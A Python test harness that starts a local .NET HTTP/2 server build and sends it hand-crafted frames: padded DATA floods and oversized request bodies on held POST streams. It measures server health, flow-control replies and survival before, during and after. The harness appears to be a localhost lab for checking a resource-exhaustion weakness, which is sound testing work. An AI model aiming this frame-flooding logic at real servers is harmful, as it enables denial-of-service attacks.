import json
import os
import socket
import subprocess
import time

HOST, PORT = "127.0.0.1", 50743
PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
SETTINGS = b"\x00\x00\x00\x04\x00\x00\x00\x00\x00"

def frame(kind, flags, stream, payload=b""):
    return len(payload).to_bytes(3, "big") + bytes([kind, flags]) + stream.to_bytes(4, "big") + payload

def headers(path, method):
    p = path.encode()
    return bytes([0x82 if method == "GET" else 0x83, 0x86, 0x04, len(p)]) + p + b"\x01\x09localhost"

def connect():
    s = socket.create_connection((HOST, PORT), timeout=2)
    s.settimeout(2)
    s.sendall(PREFACE + SETTINGS)
    return s

def collect(s, seconds, stop_stream=None):
    end = time.monotonic() + seconds
    buf = bytearray()
    frames = []
    while time.monotonic() < end:
        s.settimeout(max(0.01, min(0.15, end - time.monotonic())))
        try:
            part = s.recv(65536)
        except socket.timeout:
            continue
        except OSError as e:
            frames.append(("error", 0, 0, str(e).encode()))
            break
        if not part:
            frames.append(("closed", 0, 0, b""))
            break
        buf.extend(part)
        while len(buf) >= 9:
            size = int.from_bytes(buf[:3], "big")
            if len(buf) < size + 9:
                break
            kind, flags = buf[3], buf[4]
            stream = int.from_bytes(buf[5:9], "big") & 0x7fffffff
            payload = bytes(buf[9:9 + size])
            del buf[:9 + size]
            frames.append((kind, flags, stream, payload))
            if stop_stream == stream and kind in (0, 1) and flags & 1:
                return frames
    return frames

def health():
    s = connect()
    try:
        s.sendall(frame(1, 5, 1, headers("/health", "GET")))
        rows = collect(s, 2, stop_stream=1)
        body = b"".join(x[3] for x in rows if x[0] == 0 and x[2] == 1)
        return json.loads(body) if body else None
    finally:
        s.close()

def sample(count):
    rows = []
    for _ in range(count):
        start = time.monotonic()
        try:
            value = health()
            rows.append({"ms": round((time.monotonic() - start) * 1000, 1), "value": value})
        except Exception as e:
            rows.append({"ms": round((time.monotonic() - start) * 1000, 1), "error": str(e)})
        time.sleep(0.03)
    good = [x for x in rows if x.get("value", {}).get("ok")]
    return {"ok": len(good), "total": len(rows), "max_ms": max(x["ms"] for x in rows),
            "workingSet": good[-1]["value"]["workingSet"] if good else None,
            "managed": good[-1]["value"]["managed"] if good else None,
            "threads": good[-1]["value"]["threads"] if good else None,
            "cpuMs": good[-1]["value"]["cpuMs"] if good else None,
            "runtime": good[-1]["value"]["runtime"] if good else None}

def describe(frames):
    return {"goaway": [{"lastStream": int.from_bytes(x[3][:4], "big") & 0x7fffffff,
                          "code": int.from_bytes(x[3][4:8], "big")}
                         for x in frames if x[0] == 7 and len(x[3]) >= 8],
            "windowUpdates": [{"stream": x[2], "amount": int.from_bytes(x[3], "big") & 0x7fffffff}
                              for x in frames if x[0] == 8 and len(x[3]) == 4],
            "closed": any(x[0] in ("closed", "error") for x in frames),
            "frameCount": len(frames)}

def run_case(assembly, version, config, mode):
    env = os.environ.copy()
    env["F043_TIGHT"] = "1" if config == "tight" else "0"
    proc = subprocess.Popen(["dotnet", assembly], env=env, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
    result = {"version": version, "config": config, "mode": mode}
    attack = None
    try:
        for _ in range(50):
            if proc.poll() is not None:
                raise RuntimeError("server exited at startup")
            try:
                if health():
                    break
            except Exception:
                time.sleep(0.1)
        else:
            raise RuntimeError("server did not become healthy")
        result["before"] = sample(3)
        attack = connect()
        streams = (1, 3)
        for sid in streams:
            attack.sendall(frame(1, 4, sid, headers("/hold", "POST")))
        if config == "tight":
            pad_each = 16 * 1024
            body_each = (24 if mode == "valid" else 40) * 1024
        else:
            pad_each = 64 * 1024
            body_each = (400 if mode == "valid" else 560) * 1024
        pad_wire = body_wire = 0
        if mode == "prepad":
            for sid in streams:
                padded = frame(0, 8, sid, b"\xff" + b"\x00" * 255)
                count = pad_each // 256
                attack.sendall(padded * count)
                pad_wire += len(padded) * count
        pre = collect(attack, 0.25)
        send_error = None
        for sid in streams:
            left = body_each
            while left:
                n = min(left, 16384)
                try:
                    attack.sendall(frame(0, 0, sid, b"x" * n))
                except OSError as e:
                    send_error = type(e).__name__ + ": " + str(e)
                    break
                body_wire += n + 9
                left -= n
            if send_error:
                break
        result["sent"] = {"padWire": pad_wire, "bodyWire": body_wire,
                          "plannedBodyData": body_each * len(streams), "sendError": send_error}
        assert pad_wire + body_wire < 1_500_000
        result["during"] = sample(5)
        result["signalsBeforeBody"] = describe(pre)
        result["signalsAfterBody"] = describe(collect(attack, 0.5))
        attack.close()
        attack = None
        time.sleep(0.15)
        result["after"] = sample(3)
        result["alive"] = proc.poll() is None
    except Exception as e:
        result["error"] = type(e).__name__ + ": " + str(e)
    finally:
        if attack:
            attack.close()
        proc.terminate()
        try:
            _, err = proc.communicate(timeout=3)
        except subprocess.TimeoutExpired:
            proc.kill()
            _, err = proc.communicate(timeout=3)
        result["serverLogTail"] = err.decode(errors="replace")[-1200:]
    return result

def main():
    for version in ("net10.0", "net11.0"):
        assembly = os.path.abspath(os.path.join("f043-lab", "bin", "Debug", version, "f043-lab.dll"))
        for config in ("default", "tight"):
            for mode in ("valid", "no_pad", "prepad"):
                print(json.dumps(run_case(assembly, version, config, mode)), flush=True)
    assembly = os.path.abspath(os.path.join("f043-lab", "bin", "Debug", "net10.0", "f043-lab.dll"))
    print(json.dumps(run_case(assembly, "net10.0", "default", "prepad-repeat")), flush=True)
    print("F043_TARGETED_LAB_COMPLETE", flush=True)

if __name__ == "__main__":
    main()
